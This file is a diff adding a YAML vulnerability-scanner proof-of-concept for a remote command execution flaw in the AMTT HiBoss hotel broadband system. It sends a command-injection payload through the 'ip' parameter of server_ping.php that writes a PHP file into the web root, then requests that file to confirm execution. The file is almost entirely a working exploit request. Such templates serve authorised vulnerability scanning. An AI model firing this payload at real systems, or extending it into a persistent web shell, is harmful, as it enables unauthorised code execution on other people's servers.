@@ -1,0 +1,18 @@
+name: poc-yaml-amtt-hiboss-server-ping-rce
+set:
+  r2: randomLowercase(10)
+rules:
+  - method: GET
+    path: /manager/radius/server_ping.php?ip=127.0.0.1|echo%20"<?php%20echo%20md5({{r2}});unlink(__FILE__);?>">../../{{r2}}.php&id=1
+    expression: |
+      response.status == 200 && response.body.bcontains(b"parent.doTestResult")
+  - method: GET
+    path: /{{r2}}.php
+    expression: |
+      response.status == 200 && response.body.bcontains(bytes(md5(r2)))
+
+detail:
+  author: YekkoY
+  description: "安美数字-酒店宽带运营系统-远程命令执行漏洞"
+  links:
+    - http://wiki.peiqi.tech/PeiQi_Wiki/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E5%AE%89%E7%BE%8E%E6%95%B0%E5%AD%97/%E5%AE%89%E7%BE%8E%E6%95%B0%E5%AD%97%20%E9%85%92%E5%BA%97%E5%AE%BD%E5%B8%A6%E8%BF%90%E8%90%A5%E7%B3%BB%E7%BB%9F%20server_ping.php%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.html
